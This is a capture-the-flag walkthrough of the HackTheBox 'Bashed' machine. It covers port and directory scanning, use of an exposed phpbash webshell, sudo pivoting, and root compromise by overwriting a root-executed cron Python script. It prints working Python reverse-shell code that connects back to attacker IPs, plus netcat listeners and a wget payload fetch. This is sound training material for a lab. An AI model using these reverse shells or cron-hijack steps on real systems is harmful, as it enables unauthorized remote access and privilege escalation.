## ------------------>> Bashed <<---------------

// We start with nmap scan

    $ nmap -sV -A -Pn -T4 10.10.10.68 -p-
----------

    Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-20 19:50 EDT
    Nmap scan report for 10.10.10.68
    Host is up (0.17s latency).
    Not shown: 65534 closed ports
    PORT   STATE SERVICE VERSION
    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: Arrexel's Development Site

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 579.17 seconds

// Navigate to http://10.10.10.68/

![Image 1](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Bashed/1.png)

// Lets search for some directories or files with [dirsearch]()

    $ python3 dirsearch.py -u http://10.10.10.68/ -t 150
------

      _|. _ _  _  _  _ _|_    v0.4.1
     (_||| _) (/_(_|| (_| )

    Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 150 | Wordlist size: 10903

    Output File: /home/r4r3/Desktop/HTB/main-Tools/web/directories_scanners/dirsearch/reports/10.10.10.68/_21-08-20_19-55-15.txt

    Error Log: /home/r4r3/Desktop/HTB/main-Tools/web/directories_scanners/dirsearch/logs/errors-21-08-20_19-55-15.log

    Target: http://10.10.10.68/

    ...
    [19:55:25] 200 -    8KB - /about.html
    [19:55:30] 200 -    0B  - /config.php
    [19:55:30] 200 -    8KB - /contact.html
    [19:55:31] 200 -    1KB - /dev/
    [19:55:33] 200 -    2KB - /images/
    [19:55:33] 200 -    8KB - /index.html
    [19:55:33] 200 -    3KB - /js/
    [19:55:35] 200 -  939B  - /php/
    [19:55:37] 403 -  300B  - /server-status/
    [19:55:40] 200 -   14B  - /uploads/

// we got some interesting directories the most interesting its /dev/

// Navigate to http://10.10.10.68/dev/

![Image 2](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Bashed/2.png)

// Clicking on 'phpbash.php' gives us a webshell ! and user flag !

![Image 3](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Bashed/3.png)

### ----Privelleges Escalation-------

// After verify we got python on the target system

    www-data@bashed:/var/www/html/dev# which python

    /usr/bin/python

// We can get a better shell with python(from [here](https://www.pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet))

// First open a listiner

    $nc -lvnp 1444
    listening on [any] 1444 ...
------

    $ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.244",1444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

// And we got a shell

    $ nc -lvnp 1444
    listening on [any] 1444 ...
    connect to [10.10.16.244] from (UNKNOWN) [10.10.10.68] 58676
    /bin/sh: 0: can't access tty; job control turned off
    $ id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    
// Checking which sudo permission have www-data we can see that he can run scriptmanager

    $ sudo -u scriptmanager /bin/bash

    id
    uid=1001(scriptmanager) gid=1001(scriptmanager) groups=1001(scriptmanager)

// Now we got shell as scriptmanager, searching the system i found directory called 'scripts' that its user own in '/'

    $ pwd
    /

    $ ls -al
    total 88
    ...
    drwxr-xr-x  18 root          root            500 Aug 20 16:49 run
    drwxr-xr-x   2 root          root           4096 Dec  4  2017 sbin
    drwxrwxr--   2 scriptmanager scriptmanager  4096 Dec  4  2017 scripts
    drwxr-xr-x   2 root          root           4096 Feb 15  2017 srv
    ...

    $ cd scripts

    $ ls
    test.py
    test.txt

// In /scripts we have 2 files (test.py & test.txt)

    $ cat test.py
    f = open("test.txt", "w")
    f.write("testing 123!")
    f.close

    $ cat test.txt
    testing 123!

// Checking for file permissions we can see that root own test.txt file

    $ ls -al
    total 16
    drwxrwxr--  2 scriptmanager scriptmanager 4096 Dec  4  2017 .
    drwxr-xr-x 23 root          root          4096 Dec  4  2017 ..
    -rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
    -rw-r--r--  1 root          root            12 Aug 20 17:33 test.txt

// Also checking after few minutes i can see that file is modify himself

    $ ls -al
    total 16
    drwxrwxr--  2 scriptmanager scriptmanager 4096 Dec  4  2017 .
    drwxr-xr-x 23 root          root          4096 Dec  4  2017 ..
    -rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
    -rw-r--r--  1 root          root            12 Aug 20 17:33 test.txt
    $ ls -al
    total 16
    drwxrwxr--  2 scriptmanager scriptmanager 4096 Dec  4  2017 .
    drwxr-xr-x 23 root          root          4096 Dec  4  2017 ..
    -rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
    -rw-r--r--  1 root          root            12 Aug 20 17:35 test.txt

// Lets try to modify the test.py file to give us a shell as root

// first we will make reverse shell file with python(found one [here](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet))

    $ cat exploit.py

    import socket,subprocess,os
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("10.10.14.24",1337)) //change this
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
    
// For upload the file we will open http python server

    $ python3 -m http.server 9001
    Serving HTTP on 0.0.0.0 port 9001 (http://0.0.0.0:9001/) ...

// Open a listiner in another terminal

    $nc -lvnp 1445
    listening on [any] 1445 ...

// And upload the exploit.py with wget command

    $ wget http://10.10.16.244:9001/exploit.py

// Wait a few seconds, and we got a root shell and the flag !

    $ nc -lvnp 1445
    
    listening on [any] 1445 ...
    connect to [10.10.16.244] from (UNKNOWN) [10.10.10.68] 48982
    /bin/sh: 0: can't access tty; job control turned off
    # id 
    uid=0(root) gid=0(root) groups=0(root)
    # cat root/root.txt    
    cat: root/root.txt: No such file or directory
    # cat /root/root.txt
    cc4f0afe....................

